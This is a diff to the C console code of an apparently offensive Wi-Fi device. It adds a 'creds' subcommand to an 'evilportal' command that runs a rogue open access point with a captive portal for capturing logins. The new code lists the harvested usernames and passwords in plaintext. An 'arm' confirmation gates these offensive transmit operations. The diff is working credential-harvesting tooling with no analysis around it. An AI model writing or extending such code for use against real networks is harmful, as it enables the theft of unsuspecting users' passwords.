@@ -1174,9 +1174,15 @@ static int cmd_disarm(int argc, char **argv)
     return 0;
 }
 
-// `evilportal [ssid|stop]` — the evil_portal op: rogue OPEN AP + captive credential-capture portal. An
-// OFFENSIVE-TX op, so it needs arm (`agree`, then `arm` -> `arm <token>`). `evilportal stop` tears it down
-// and reports the capture count; `evilportal [ssid]` starts it (default SSID if none given).
+// Print callback for `evilportal creds` — one captured user/pass pair per line.
+static void ep_print_cred(const char *user, const char *pass)
+{
+    printf("  user='%s' pass='%s'\n", user, pass);
+}
+
+// `evilportal [ssid|creds|stop]` — the evil_portal op: rogue OPEN AP + captive credential-capture portal.
+// OFFENSIVE-TX op, so it needs arm (`agree`, then `arm` -> `arm <token>`). `evilportal stop` tears it down;
+// `evilportal creds` lists the retained captures; `evilportal [ssid]` starts it (default SSID if none).
 static int cmd_evilportal(int argc, char **argv)
 {
     if (locked()) {
@@ -1190,6 +1196,16 @@ static int cmd_evilportal(int argc, char **argv)
         lxveos_evilportal_stop();
         printf("evil-portal stopped (%u credential(s) captured)\n",
                (unsigned)lxveos_evilportal_captures());
+        return 0;
+    }
+    if (argc >= 2 && strcmp(argv[1], "creds") == 0) {
+        uint32_t n = lxveos_evilportal_captures();
+        if (n == 0) {
+            printf("no credentials captured\n");
+            return 0;
+        }
+        printf("captured credentials (%u total, last %u shown):\n", (unsigned)n, n < 16 ? (unsigned)n : 16u);
+        lxveos_evilportal_creds_each(ep_print_cred);
         return 0;
     }
     if (lxveos_evilportal_running()) {
@@ -1235,7 +1251,7 @@ static void register_commands(void)
         {.command = "status", .help = "One machine-readable status line (Cyber Controller bridge format)", .func = &cmd_status},
         {.command = "arm", .help = "Two-factor enable for offensive-TX ops: arm (request), then arm <token> (confirm)", .func = &cmd_arm},
         {.command = "disarm", .help = "Hard-disarm: return to SAFE (offensive TX not permitted)", .func = &cmd_disarm},
-        {.command = "evilportal", .help = "Rogue AP + captive credential portal (needs arm): evilportal [ssid|stop]", .func = &cmd_evilportal},
+        {.command = "evilportal", .help = "Rogue AP + captive credential portal (needs arm): evilportal [ssid|creds|stop]", .func = &cmd_evilportal},
         {.command = "loglevel", .help = "Set log verbosity: loglevel <tag|*> <none|error|warn|info|debug|verbose>", .func = &cmd_loglevel},
         {.command = "reboot", .help = "Restart the unit", .func = &cmd_reboot},
         {.command = "nvs", .help = "Persistent settings: nvs get <key> | nvs set <key> <value>", .func = &cmd_nvs},
